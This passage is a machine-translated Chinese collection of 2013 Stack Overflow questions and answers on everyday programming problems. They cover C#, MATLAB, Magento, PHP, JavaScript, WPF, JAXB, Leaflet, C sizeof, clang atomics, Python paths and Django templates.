如果您想使用 BootstrapCDN，那么您需要覆盖您想要在另一个 css 文件中更改的 css 声明并自己托管该文件。

如果您愿意，尽管您可以编辑 bootstrap .less 文件，然后编译您自己的 Bootstrap，或者使用[http://twitter.github.io/bootstrap/customize.html](http://twitter.github.io/bootstrap/customize.html)创建您自己的版本来下载 - 当然那么您要么必须自己托管它们，要么使用另一个 CDN。

# c# - 有没有办法在线获取日期\时间值？

> ID：16215379
> 
> 赞同：-8
> 
> 时间：2013-04-25T12:57:47.433
> 
> 标签：c#, java, date

我的电脑在每次重启\睡眠时都会重置其日期时间，所以我想编写一个应用程序来设置每次启动时的时间有没有办法在 C# 或 JAVA 中在线获取当前日期时间？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:28:19.100

这是一个很好的帖子： http: [//nickstips.wordpress.com/2010/02/12/c-get-nist-internet-time/](http://nickstips.wordpress.com/2010/02/12/c-get-nist-internet-time/)
它非常详细地描述了如何实现你想要的:)

# console - Nunit 将参数从 nunit-console 传递给 Test

> ID：16215382
> 
> 赞同：2
> 
> 时间：2013-04-25T12:57:50.553
> 
> 标签：console, nunit, runner

我在下面使用将单个参数传递给我的测试。

```
C:\Documents and Settings\>"C:\Program Files\NUnit 2.6.2\bin\nunit-console" "D:\Automation\ClassLibrary2\bin\Debug\ClassLibrary2.dll /run:ClassLibrary2.Class1.Test1(\"option1\") 
```

我的代码：

```
namespace ClassLibrary2
{
    [TestFixture]
    public class Class1
    {
        [Test]
        public void Test1(string browser)
        {
            MessageBox.Show(Browse );
        }

    }
} 
```

结果：测试运行：0，错误：0，失败：0，不确定：0，时间：0 秒

那么如何将参数直接从 nunit-console 传递给 Test。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-08-30T10:56:25.410

我通常解决问题的方法是允许环境变量覆盖配置属性。

然后我可以控制来自构建脚本、构建服务器等的环境变量，以控制测试在我希望它们运行的​​环境中运行。

例如：

```
[TestFixture]
public class DataAccessTest
{
    static string GetConnectionString() {
        return Environment.GetEnvironmentVariable("ConnectionStringForTest") ?? DefaultConnectionString;
    }

    [Test]
    public void Test() {
        var context = new DataContext(GetConnectionString());
        ...
    }
} 
```

# matlab - 从每行添加不同数量的元素

> ID：16215383
> 
> 赞同：4
> 
> 时间：2013-04-25T12:57:54.933
> 
> 标签：matlab, vectorization

我有一个主矩阵，比如说

```
A=magic(5); 
```

也是一个向量

```
v=[1;3;5;2;2]; 
```

我想以这种方式将 A 的元素逐行相加：将第一行从 v(1)st 元素添加到末尾，将第二行从 v(2)rd 元素添加到末尾，第三行从 v (3) 到最后的元素，以此类推。

我知道我可以使用 for 循环来做到这一点。但我想知道是否有一种矢量化的方式来做到这一点。

**编辑：** 让我用一个例子来澄清我的问题：假设 A 和 v 如上所述。

```
A =

 17    24     1     8    15
 23     5     7    14    16
  4     6    13    20    22
 10    12    19    21     3
 11    18    25     2     9 
```

和

```
v =

 1
 3
 5
 2
 2 
```

现在我想要一种方法来获得以下结果：

```
answer =
 65  % 17+24+1+8+15
 37  % 7+14+16
 22  % 22
 55  % 12+19+21+3
 54  % 18+25+2+9 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:18:02.390

您可以`cumsum`沿行使用。解决方案有点复杂，所以我将从一个更简单的示例开始：

假设您想对`i`第 - 行的所有元素求和，`A`直到（包括）`v(i)`第 - 位： res_i = \sum_{k=1..v(i)} A_ik

```
m = size(A,1); % num of rows
csA = cumsum(A, 2); % cumsum along rows
res = csA( sub2ind( size(A), 1:m, v ) ); % pick the vi-th column for the i-th row 
```

**现在，对于你的问题，既然你想要从头到尾** 的所有元素的总和`v(i)`，我们需要相应地翻转`A`和改变`v`

```
[m n] = size(A);
fA = fliplr(A);
fv = n + 1 - v; % flip the meaning of v
csA = cumsum( fA, 2 ); 
res = csA( sub2ind( [m n], 1:m, fv ) ); % should do the trick... 
```

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2013-04-25T13:44:53.427

我知道这有点作弊，但怎么样：

```
S = arrayfun(@(ii) sum(A(ii, v(ii):end)), 1:size(A,1)).'; 
```

通常我在使用时有点疲倦`arrayfun`，但在比较时：

```
% sample data
N = 5000;

A = magic(N);
v = randi(N, N,1);

% simple loop
tic
    S = zeros(N,1);
    for ii = 1:N
        S(ii) = sum(A(ii, v(ii):end));
    end
toc

% arrayfun solution    
tic
    S = arrayfun(@(ii) sum(A(ii, v(ii):end)), 1:N).';
toc

% Shai's solution 
tic
    [m n] = size(A);
    fA = fliplr(A);
    fv = n + 1 - v; 
    csA = cumsum( fA, 2 ); 
    res = csA( sub2ind( [m n], 1:m, fv.' ) ).';
toc 
```

结果：

```
Elapsed time is 0.386280 seconds. % simple loop
Elapsed time is 0.473916 seconds. % arrayfun
Elapsed time is 0.495794 seconds. % Shai's solution 
```

所以，`arrayfun`毕竟还不错。

但是这里有一个重要的点：从远处看一下实现。循环解决方案有多容易阅读/理解？矢量化解决方案怎么样？

考虑到这一点，还要看看表演。那是一个 5000x5000 矩阵......那里有 2500*万*个元素......

现在，你*真的*想避免那个循环吗？

# magento - 使用代码在 Magento 中没有获得热门搜索

> ID：16215384
> 
> 赞同：1
> 
> 时间：2013-04-25T12:58:02.027
> 
> 标签：magento, search, magento-1.7

如何在主页上获取热门搜索词？？

我参考了以下问题： [在 Magento 中获得热门搜索](https://stackoverflow.com/questions/5434116/getting-popular-searches-in-magento)

因此，我使用了与以下相同的代码：

```
$searchCollectino=Mage::getModel('catalogsearch/query')->getCollection()
 ->setPopularQueryFilter()
 ->setPageSize($limit); 
```

他们告诉我们使用 ->getItems() 我们可以获得搜索词。

但我不知道代码到底是什么......？

这个代码怎么用？？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-04-29T15:00:50.290

我通过以下代码获得了前 5 个热门搜索词：

```
$searchCollection = Mage::getModel('catalogsearch/query')->getCollection()
 ->setOrder('popularity', 'DESC');
$searchCollection->getSelect()->limit(8);
foreach ($searchCollection as $item)
{  
    echo $item->getData('redirect');
    echo $item->getData('query_text');
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-04-25T19:57:20.177

```
`$searchCollection = Mage::getModel('catalogsearch/query')->getCollection()
 ->setOrder('popularity', 'DESC');
 $searchCollection->getSelect()->limit(5);
 $searchCollection->getItems();` 
```

这将获取有限制的热门搜索

希望你喜欢它 ：）

# php - 使用 exec 将数据附加到不在当前目录中的文件

> ID：16215386
> 
> 赞同：0
> 
> 时间：2013-04-25T12:58:03.553
> 
> 标签：php, linux, centos, exec

我正在尝试设置一个小脚本以允许 php 将数据附加到文件中

该文件是 etc/httpd/conf/httpd.conf

我想自动将数据添加到文件中以供 vhost 使用...

```
echo shell_exec('echo "hello" >> /etc/httpd/conf/httpd.conf'); 
```

代码不工作，不输出任何东西

我有一种感觉是由于工作目录，

我欢迎使用任何其他方式来执行此操作...但必须能够通过 php 窗口调用

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:00:19.960

可能是权限问题。你的 httpd.conf 有什么权限？`ls -l /etc/httpd/conf/httpd.conf`如果你在 Linux/Mac 上，你可以检查使用。

# javascript - 互联网浏览器中 offsetLeft 的替代方法是什么（不适用于 ie 中的我）

> ID：16215393
> 
> 赞同：0
> 
> 时间：2013-04-25T12:58:30.737
> 
> 标签：javascript

我的问题很明显，不需要澄清。

我的代码

```
document.onkeypress = function(evt) {
                var elem = document.getElementById('box');
                evt = evt || window.event;
                var charCode = evt.charCode || evt.keyCode;
                switch (charCode) {
                    case 37:
                        elem.style.position = 'absolute';
                        elem.style.left = parseInt(elem.offsetLeft - 10) + 'px';
                        elem.innerHTML = elem.offsetLeft;
                        break;
                    case 38:
                        elem.style.position = 'absolute';
                        elem.style.top = parseInt(elem.offsetTop - 10) + 'px';
                        elem.innerHTML = elem.offsetTop;
                        break;
                    case 39:
                        elem.style.position = 'absolute';
                        elem.style.left = parseInt(elem.offsetLeft + 10) + 'px';
                        elem.innerHTML = elem.offsetLeft;
                        break;

                    case 40:
                        elem.style.position = 'absolute';
                        elem.style.top = parseInt(elem.offsetTop + 10) + 'px';
                        elem.innerHTML = elem.offsetTop;
                        break;
                    case 101:
                        elem.style.position = 'relative';
                        elem.style.left = 0 + 'px';
                        elem.style.top = 0 + 'px';
                        break;

                    default:

                }
            }; 
```

前面的示例在 ff 中运行良好，但在 ie 中无法运行。

是什么原因在 IE`offsetLeft`中`offsetTop` 不起作用。
有没有互联网浏览器的替代品，有什么问题？

* * *

## 试试jsfiddle中的[演示。](http://jsfiddle.net/ZbDnT/)

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-25T13:29:42.447

我相信一个简单的解决方法是将您正在监听的事件从 keypress 更改为 keydown

```
document.onkeydown = function(evt) { 
```

[JSFiddle](http://jsfiddle.net/Zp8bB/1/show/)

# visual-studio-2010 - 为 BarButtonItem 添加选项未出现在 Visual Studio 表单设计器中

> ID：16215398
> 
> 赞同：0
> 
> 时间：2013-04-25T12:58:51.640
> 
> 标签：visual-studio-2010, devexpress, devexpress-windows-ui

有时当我打开我的 Visual Studio 表单设计器时，我会看到 [Add] 文本来创建一个新的 BarButtonItem，而其他时候我没有。这导致我现在多次寻找一种创建新按钮的方法。知道可能是什么原因造成的吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-28T14:52:38.883

尝试右键单击您的酒吧经理，然后检查**Show DesignTime Enhancements**。这是一个可能有帮助[的链接。](http://documentation.devexpress.com/#WindowsForms/CustomDocument5350)

# javascript - 如何在该文本框的keydown事件上获取文本框的ID

> ID：16215399
> 
> 赞同：1
> 
> 时间：2013-04-25T12:58:54.140
> 
> 标签：javascript, asp.net, onkeydown, onkeyup

我的页面中有一个文本框：

```
<td>
<input type="text" id="Approvers1" size="11" onkeydown="AddUsersKeyDown(event)" style="width: 470px;" />
</td> 
```

这是我的 js 函数：

```
function AddUsersKeyDown(evtobj) {

    if (evtobj.keyCode == 75 && evtobj.ctrlKey) {

        AddUsers(--input parameter--);
    }
} 
```

现在，如果我在我的文本框中按 ctrl k，它必须调用另一个名为 AddUsers(--input parameter--).. 的 javascript 函数。其中**输入参数应该是文本框的 id** ...

如何实现这一点。我需要文本框的 id 或至少 DOM 对象，以便我可以从 DOM 对象访问文本框的 id。

请帮助我实现这两件事中的任何一件。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2013-04-25T13:03:29.500

首先，您应该将函数重命名为，`AddUsersKeyDown`以便触发 keydown 事件。在事件对象上，有一个`target`属性，它具有触发 DOM 元素。您可以使用该信息来获取 ID。

```
 <input type="text" id="Approvers1" size="11" onkeydown="AddUsersKeyDown(event)" style="width: 470px;" /> 
```

和 Javascript：

```
function AddUsersKeyDown(evtobj) {

    var target = evtobj.target || evtobj.srcElement;

    if (evtobj.keyCode == 75 && evtobj.ctrlKey) {
        AddUsers(target.id);

        return false;
    }
} 
```

这是一个jsfiddle：http: [//jsfiddle.net/q26Nv/3/](http://jsfiddle.net/q26Nv/3/)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-04-25T13:09:57.600

在这里获取 [jquery](http://jquery.com/)

然后采取 onkeydown

```
<input type="text" id="Approvers1" class="keydown" size="11" style="width: 470px;" /> 
```

添加脚本

```
<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.0/jquery.min.js"></script>
<script>
$(function() {
    $('.keydown').keydown(function() {
       console.log( $(this).attr('id') );
    });
});
<script> 
```

也许有很多代码，但你可以确定它是跨浏览器 [文档](http://api.jquery.com/keydown/)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T13:01:27.433

用于`this`获取 DOM 元素或`this.id`获取元素的 id

```
<td>
<input type="text" id="Approvers1" size="11" onkeydown="AddUsersKeyDown(event,this.id)" style="width: 470px;" />
</td>

function AddUsersKeyDown(evtobj,id) {

    if (evtobj.keyCode == 75 && evtobj.ctrlKey) {

        AddUsers(id);
    }
} 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-04-25T13:05:20.163

你可以：

```
function AddUserKeyDown(evtobj) {
    evtobj = evtobj || window.event;
    var target = evtobj.target || evtobj.srcElement;

    if (evtobj.keyCode == 75 && evtobj.ctrlKey) {
       AddUsers(target.id);
    }
} 
```

（你的功能名称不匹配顺便说一句）

# wpf - 控制初始化步骤的混乱顺序

> ID：16215408
> 
> 赞同：0
> 
> 时间：2013-04-25T12:59:19.630
> 
> 标签：wpf, wpf-controls

我想知道当我启动 WPF 应用程序时，控件的初始化过程中到底发生了什么？

DP什么时候初始化？什么时候绑定？DataContext 什么时候设置？DataContext 在控件的构造函数中是否可用？有什么顺序吗？

我意识到我遇到了一个陷阱，一旦我在控件的构造函数内的 DP 的 getter/setter 上设置了一个值，DP 值就会被更新，但这些值也会立即回滚到默认值为 null。

所以我的猜测是构造函数首先被初始化，然后是依赖属性。

有人可以帮我解决这个问题吗？

编辑：只为瑞秋。dp 接收到值 234 并立即回滚为 null。我认为这是因为首先调用了构造函数，然后发生了 dps 的初始化，这将 dp 设置回 null ，因为 null 是默认值。我想错了吗？控件或依赖对象的初始化步骤的顺序是什么。

```
class MySuperDuperCoolClass : ContentControl
{
  public MySuperDuperCoolClass()
  {
    InitalizeComponents();
    this.MySuperDuperProperty = "234";
  }

  public string MySuperDuperProperty
  {
    get { return (string)GetValue(MySuperDuperPropertyProperty);}
    set { SetValue(MySuperDuperPropertyProperty, value);}
  }

  public static DependencyProperty MySuperDuperPropertyProperty =
    DependencyProperty.Register("MySuperDuperProperty", typeof(string), typeof(MySuperDuperCoolClass), 
    new PropertyMetadata(null));

} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T14:32:32.727

我发现[DispatcherPriority 枚举](http://msdn.microsoft.com/en-us/library/system.windows.threading.dispatcherpriority.aspx)对于调用确切的事件顺序很有用：

*   发送
*   **正常**- 构造函数在这里运行
*   **数据绑定**
*   **使成为**
*   **已加载**
*   背景
*   上下文空闲
*   应用空闲
*   系统空闲
*   不活跃
*   无效的
*   输入

如您所见，构造函数首先运行，然后是数据绑定。

`DependencyProperties`在创建对象时进行初始化，就像任何其他属性一样，因此这将在构造函数运行之前发生，因此该属性存在于构造函数中。

设置`DataContext`属性或其他`DependencyProperties`工作就像您设置的任何其他属性一样。如果您使用绑定设置它们，它们将在构造函数之后被评估。如果在 XAML 中设置它们，它们将在构造函数中设置。如果您在 Loaded 事件中设置它们，它们将在所有内容都被构造、绑定和渲染后被设置。

您也可能会发现[这个 SO 答案](https://stackoverflow.com/a/1746975/302677)很有用：

> **创建和显示窗口时的事件序列**
> 
> 根据要求，以下是创建和显示窗口时 WPF 中的主要事件序列：
> 
> 1.  在创建对象时调用构造函数和 getter/setter，包括正在更新的对象以及从它们继承的任何对象上的 PropertyChangedCallback、ValidationCallback 等
>     
>     
> 2.  当每个元素被添加到可视化或逻辑树时，它的 Intialized 事件会被触发，这会导致除了您可以定义的任何特定于元素的初始化之外，还可以找到样式和触发器 [注意：不会为逻辑树中的叶子触发初始化事件如果根目录下没有 PresentationSource（例如 Window）]
>     
>     
> 3.  窗口及其上所有未折叠的视觉对象都是测量的，这会在每个控件上产生一个 ApplyTemplate，这会导致额外的对象树构造，包括更多的构造函数和 getter/setter
>     
>     
> 4.  窗口及其上所有未折叠的视觉对象均已排列
>     
>     
> 5.  窗口及其后代（逻辑和视觉）接收到 Loaded 事件
>     
>     
> 6.  任何在首次设置时失败的数据绑定都会重试
>     
>     
> 7.  窗口及其后代有机会以视觉方式呈现其内容
>     
>     
> 
> 步骤 1-2 在创建窗口时完成，无论它是否显示。其他步骤通常在显示窗口之前不会发生，但如果手动触发它们可以更早发生。

**根据添加到问题的代码进行编辑**

你的`DependencyProperty.Register`方法在我看来很有趣。[该方法的签名与该方法的任何重载](http://msdn.microsoft.com/en-us/library/system.windows.dependencyproperty.register.aspx)都不匹配，并且您正在使用似乎是自定义`UIProperty`类来设置默认值而不是普通的[PropertyMetadata](http://msdn.microsoft.com/en-us/library/system.windows.propertymetadata.aspx)。

我可以确认，如果您的代码使用正常`DependencyProperty.Register`签名按预期运行，那么问题的可能原因是您的自定义代码中的某个地方，或者您使用/设置属性的方式。

我用于快速示例测试的代码是这样的：

```
public partial class UserControl1 : ContentControl
{
    public UserControl1()
    {
        InitializeComponent();
        this.TestDependencyProperty = "234";
    }

    public string TestDependencyProperty
    {
        get { return (string)GetValue(TestDependencyPropertyProperty); }
        set { SetValue(TestDependencyPropertyProperty, value); }
    }

    public static DependencyProperty TestDependencyPropertyProperty =
        DependencyProperty.Register("TestDependencyProperty", typeof(string), typeof(UserControl1), 
        new PropertyMetadata(null));
} 
```

XAML 是

```
<ContentControl x:Class="WpfApplication1.UserControl1"
                x:Name="TestPanel" ...>
    <Label Content="{Binding ElementName=TestPanel, Path=TestDependencyProperty}"/>
</ContentControl> 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-10-17T09:45:20.400

在 WPF 中，您使用 PropertyMetaData 设置 DP 的默认值，而不是通过构造函数。

```
public partial class UserControl1 : ContentControl
{
    public UserControl1()
    {
        InitializeComponent();
    }

    public string TestDependencyProperty
    {
        get { return (string)GetValue(TestDependencyPropertyProperty); }
        set { SetValue(TestDependencyPropertyProperty, value); }
    }

    public static DependencyProperty TestDependencyPropertyProperty =
        DependencyProperty.Register("TestDependencyProperty", typeof(string), typeof(UserControl1), 
        new PropertyMetadata("234"));
} 
```

# java - 是否可以替换 Java JRE 1.6 SE 中的 JAXB 实现版本？

> ID：16215409
> 
> 赞同：10
> 
> 时间：2013-04-25T12:59:20.543
> 
> 标签：java, jaxb

我有这个测试课

```
import javax.xml.bind.annotation.XmlElement;

class CompileTest {

   void foo( @XmlElement String in ) {
   }

} 
```

我的java版本是

```
$ java -version
java version "1.6.0_23"
Java(TM) SE Runtime Environment (build 1.6.0_23-b05)
Java HotSpot(TM) Client VM (build 19.0-b09, mixed mode, sharing) 
```

当我尝试编译该类时，我得到了

```
javac CompileTest.java
CompileTest.java:5: annotation type not applicable to this kind of declaration
   void foo( @XmlElement String in ) {
             ^
1 error 
```

这对 Java 6 有效。当我尝试将较新的 JAXB 库添加到类路径时，它没有帮助。有没有办法解决这个问题？

```
javac -cp jaxb-api-2.2.4.jar CompileTest.java 
```

* * *

## 回答 #1

> 赞同：11
> 
> 时间：2013-04-25T13:20:20.000

使用**Java 认可的标准覆盖机制**

把你的`jaxb-api-2.2.4.jar`内部`<java-home>\lib\endorsed`目录。

或者，使用 -D *java.endorsed.dirs*选项

`javac -Djava.endorsed.dirs=/your/path/to/jaxb-directory CompileTest.java`

参考资料：
[http ://docs.oracle.com/javase/6/docs/technotes/guides/standards/](http://docs.oracle.com/javase/6/docs/technotes/guides/standards/)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2013-04-25T13:14:50.733

使用“认可库”文件夹的概念。看看这里： [如何让 Ant 使用 JAXB x 而不是 Java 6 SE JAXB 类...](https://stackoverflow.com/questions/14235862/how-can-i-make-ant-use-jaxb-2-2-x-instead-of-java-6-se-jaxb-classes-in-javac)

基本上，这是一种指示 JRE 使用更新版本的 JAXB 的方法。

您可以在此处阅读更多内容： [JAXB 非官方指南：将 JAXB 2 与 SE 6 一起使用](https://jaxb.java.net/guide/Migrating_JAXB_2_0_applications_to_JavaSE_6.html#Using_JAXB_2_1_or_JAXB_2_2_with_JavaSE_6) 另请参阅此问题： [在 JRE 6 中使用认可目录的确切方法是什么](https://stackoverflow.com/questions/2859471/what-is-the-exact-way-to-use-endorsed-directory-in-jdk1-6)

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2013-04-25T13:02:26.057

它只能应用于字段或方法，不能应用于方法参数。看

```
@Retention(RUNTIME) @Target({FIELD, METHOD})
public @interface XmlElement { 
```

编辑：XmlElement 的来源（JDK 1.6.0_18）

```
 * @since JAXB2.0
 * @version $Revision: 1.19 $
 */

@Retention(RUNTIME) @Target({FIELD, METHOD})
public @interface XmlElement { 
```

所以我看到的是 1.6.0_18 版本具有 1.19 版本的 XmlElement，只有`FIELD`和`METHOD`目标可用。

编辑：所以你的问题是 jdk 1.6 XmlElement 与 jaxb.2.2 不同。您可以在[http://grepcode.com/file/repo1.maven.org/maven2/javax.xml.bind/jaxb-api/2.2.4/javax/xml/bind/annotation/XmlElement.java?av查看源代码=f](http://grepcode.com/file/repo1.maven.org/maven2/javax.xml.bind/jaxb-api/2.2.4/javax/xml/bind/annotation/XmlElement.java?av=f)

# javascript - 如何在传单的前面加上圆圈标记

> ID：16215412
> 
> 赞同：5
> 
> 时间：2013-04-25T12:59:47.567
> 
> 标签：javascript, leaflet

我有两个`circlemarkers`，A和B，在同一个地方

[演示](http://jsfiddle.net/tE3aU/)

当我选择标记 A 时，我希望标记 B 移到前面，反之亦然。

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-04-25T14:06:40.717

使用方法`bringToFront()`和`bringToBack()`，如 Leaflet API 中所述：http: [//leafletjs.com/reference.html#path](http://leafletjs.com/reference.html#path)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2014-05-26T17:27:33.187

如果您使用 Marker 而不是 CircleMarker，您可以使用riseOnHover 选项执行以下操作：

```
var marker = L.marker(cordinate, {riseOnHover: true});      
marker.addTo(map); 
```

**我知道这不完全是问题，但这个提示可以帮助某人。**

# c - 不同的数组大小

> ID：16215420
> 
> 赞同：0
> 
> 时间：2013-04-25T13:00:07.553
> 
> 标签：c, sizeof

当我运行以下程序时，我得到不同的数组大小。我厌倦了不同的方式，但结果是一样的，io可能做错了什么？

```
#include<stdio.h>

void array_size(char *a[])
{
    printf("Func Array Size: %d\n", sizeof(a));
}

int main()
{
    char *str_array[]={"one", "two", "three"};

    printf("Array Size: %d\n", (int)sizeof(str_array));

    array_size(str_array);

    return 0;
} 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:04:36.050

在函数 main`str_array`中是一个包含三个 的数组`char *`。

函数array_size的参数`a`只是一个指针。编译器在调用 array_size 时不会动态传递数组长度信息。

一个指针的大小不等于三个`char *`指针的大小。

* * *

## 回答 #2

> 赞同：-1
> 
> 时间：2013-04-25T13:03:11.123

这是因为`sizeof`编译器是内置的，而不是运行时函数。它被硬编码到二进制文件中。

```
`sizeof((char *)[]) = sizeof(a) = sizeof(void *)`
`sizeof(str_array) = sizeof({"one", "two", "three"}) = 3 * sizeof(char *)` 
```

# c++ - clang 3.2 在 std::atomic 上失败——一个 libc++ 问题？

> ID：16215421
> 
> 赞同：3
> 
> 时间：2013-04-25T13:00:08.937
> 
> 标签：c++, c++11, clang, atomic, libc++

我尝试编译简单的代码

```
#include <atomic>
int bar = 0;
void foo(std::atomic<int>&flag)
{ bar = flag; } 
```

使用 clang++ 3.2（从 llvm.org 下载为 llvm 3.2；在 mac os.x 10.8.3 上失败并出现错误

> /> clang++ -std=c++11 -stdlib=libc++ -O3 -march=native -c test.cc
> 
> 在 test.cc:1 中包含的文件中：
> 
> /usr/include/c++/v1/atomic:576:17：错误：原子操作的第一个参数必须是指向非 const _Atomic 类型的指针（'const _Atomic(int) *' 无效）
> 
> ```
> {return __c11_atomic_load(&__a_, __m);}
>         ^                 ~~~~~ 
> ```
> 
> /usr/include/c++/v1/atomic:580:53：注意：在此处请求成员函数“std::_ *1::* _ atomic_base::load”的实例化
> 
> ```
> operator _Tp() const _NOEXCEPT          {return load();}
>                                                 ^ 
> ```
> 
> test.cc:5:9：注意：在此处请求成员函数“std::_ *1::* _ atomic_base::operator int”的实例化
> 
> ```
> bar = done; 
> ```

当我使用 /usr/bin/clang++ 代替（操作系统或 Xcode 附带）时，它编译得很好。在这两种情况下，libc++ 都位于 /usr/lib/c++/v1 中。

我错过了什么？llvm 3.2 中是否还有另一个 libc++，但我错过了？（我在 clang3.2 树中找不到任何东西）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T15:11:28.177

Xcode 现在将 libc++ 捆绑在 Xcode.app 目录中。您可以通过控制单击 Xcode.app 并选择“显示包内容”来检查此目录。

# jquery - XMLDocument 和 JQuery .append() 之间的交互

> ID：16215424
> 
> 赞同：0
> 
> 时间：2013-04-25T13:00:22.933
> 
> 标签：jquery, xml-parsing

在我的一个 .js 文件中，我刚刚注意到我在标题中提到的 2 个元素之间的奇怪交互。

我将首先提供示例代码，然后我将更详细地解决这个问题。

```
var xmlClone = xmlCreateDocFromString(this.xmlTemplate);
$(conf.current[currentTab]).find('#' + refID).after($(xmlClone).children()); 
```

xmlCreateDocFromString 的定义在哪里：

```
function xmlCreateDocFromString(str)
{
var xmlDoc;

if ( window.DOMParser )
{
    var parser = new DOMParser();
    xmlDoc = parser.parseFromString(str, "text/xml");
}
else
{
    xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
    xmlDoc.async = false;
    xmlDoc.loadXML(str);
}

return xmlDoc; 
```

}

我正在 Chrome 上对此进行测试，所以请注意其中的“if”块。

问题是，在第一个代码块的第一行之后，xmlClone 确实具有 this.xmlTemplate 的内容，但是在使用“.after()”JQuery 函数（或 .before 或 .append）之后，xmlClone 只是变为空xmlDoc 这真的搞砸了我的代码。

所以，我需要的是一种附加 xmlClone 的内容并同时将它们保存在 xmlClone 中的方法（也就是 append 通常对 JS 对象执行的操作）。

如果您需要任何其他信息，请询问，我会尽快回复

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:03:04.170

jQuery 倾向于移动对象而不是复制它们，因为这通常是人们想要做的。

我敢肯定还有其他方法，但是您可以在附加之前克隆对象...

```
$(conf.current[currentTab]).find('#' + refID).after($(xmlClone).clone().children()); 
```

# python - 在同一文件夹中具有依赖项的 Python 导入文件

> ID：16215426
> 
> 赞同：0
> 
> 时间：2013-04-25T13:00:23.647
> 
> 标签：python

我有一个依赖于文本文件的文件 ref.py `ex.txt`，它位于同一目录`\home\ref_dir`中。所以当我运行文件时它可以正常工作`ref.py`，但是如果我尝试导入`ref.py`到另一个目录中的另一个文件 work.py `\home\work_dir`，我会执行以下操作

```
import sys
sys.path.append('\home\ref_dir')
import ref 
```

但后来我得到一个错误，程序找不到`ex.txt`

如何在不使用绝对路径的情况下解决此问题。有任何想法吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-04-25T13:05:26.450

使用 os 模块访问您所在模块的当前绝对路径，然后从中获取目录名

你会想像这样在你的文件中打开 ex.txt。

```
import os

with open('%s/ex.txt' % os.path.dirname(os.path.abspath(__file__)) as ex:
    print ex.read() 
```

# python - Django模板扩展问题

> ID：16215427
> 
> 赞同：1
> 
> 时间：2013-04-25T13:00:26.820
> 
> 标签：python, django, templates

当我使用`{% extends %}`标签时，它不会通过我的标准 html。Django模板标签有什么新东西吗？我想将 Standard,html 添加到我的 index.html 文件中，该文件也位于模板文件夹中。

我在模板文件夹中的索引文件：

```
{% extends "Standard.html" %}
{% block maincontent %}

{% block headcontent %}
<link rel="stylesheet" type="text/css" href="/media/css/Panels.css" />
<link rel="stylesheet" type="text/css" href="/media/css/HostOverview.css" />
{% endblock %}
<script>
function disaT(c,f){
if(c.checked){f.txt1.disabled=false;
f.submit.disabled=false;
}
else{f.txt1.disabled=true;
f.submit.disabled=false;
}
}
</script>
<style>
a:link {
    color: #39F;
    text-decoration: none;
}
a:visited {
    text-decoration: none;
    color: #63C;
}
a:hover {
    text-decoration: none;
    color: #CCC;
}
a:active {
    text-decoration: none;
    color: #000;
}
</style> 

<div style="display:none" id="dialog" title="Disable Your Account?">
    <p><span class="ui-icon ui-icon-alert" style="float:left; margin:0 7px 20px 0;"></span>This will disable your account and log you out. You won't be able to log back in. Are you sure you want to continue?</p>
</div>

<h1></h1>

<form name="logger" action="" method="post">
<label>Input : </label><textarea name="txtexec" id="txtexec" cols="50"/>{{ txtexec }}</textarea>&nbsp;&nbsp;<input type="submit" name="execute" value="Execute" /><br /><br />
<label>Pattern Input : </label><input name="txtpattern" id="txtpattern" type="text" size="100" value="{{ txtpattern }}" /><br />
<label>Result : </label><br />
</form> 
<P>Discover</P>
<pre>
{{ file_content }}
</pre>
<P>Console output</P>
<pre>
{{ Output_content }}
</pre>
<form name="checkin_form" action="#" method="post" enctype="multipart/form-data"><br><br>
Full pattern : <span style="color:#000; font-size:10px; background:#CCC;" >{{ session_fullpattern }}</span><br><br>
<label>Check In : </label><input type="checkbox" onclick="disaT(this,this.form)"><br>
<label>Enter pattern name : </label><input name="txt1" type="text" disabled="true">&nbsp;&nbsp;<input type="submit" name="submit" value="Submit" disabled="true" />
</form>

<div style="clear:both;" />

{% endblock %} 
```

我的standard.html页面：

```
{% extends "Base.html" %}

{% block head %}

<link rel="stylesheet" type="text/css" href="/media/css/Standard.css" />

<link rel="stylesheet" type="text/css" href="/media/css/Menu.css" />

<link rel="stylesheet" type="text/css" href="/media/css/Tooltip.css" />

<link rel="Stylesheet" type="text/css" href="/media/css/custom_theme/jquery-ui-1.7.2.custom.css" />

<script type="text/javascript" src="/media/js/jquery-1.3.2.min.js"></script>

<script type="text/javascript" src="/media/js/jquery-ui-personalized-1.6rc6.min.js"></script>

{% block headcontent %}{% endblock %}

{% endblock %} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-04-25T13:06:56.360

您将块相互嵌套，这很少是正确的做法。

你的 index.html 应该像这样开始：

```
{% extends "standard.html" %}

{% block headcontent %}
<link rel="stylesheet" type="text/css" href="/media/css/Panels.css" />
<link rel="stylesheet" type="text/css" href="/media/css/HostOverview.css" />
{% endblock %}
{% block maincontent %}
... etc 
```

但是你还需要一个地方`maincontent`进入standard.html：

```
{% extends "Base.html" %}

{% block head %}
 .... content ...
{% endblock %}
{% block headcontent %}{% endblock %}
{% block maincontent %}{% endblock %} 
```

* * *

## 回答 #2

> 赞同：1
> 
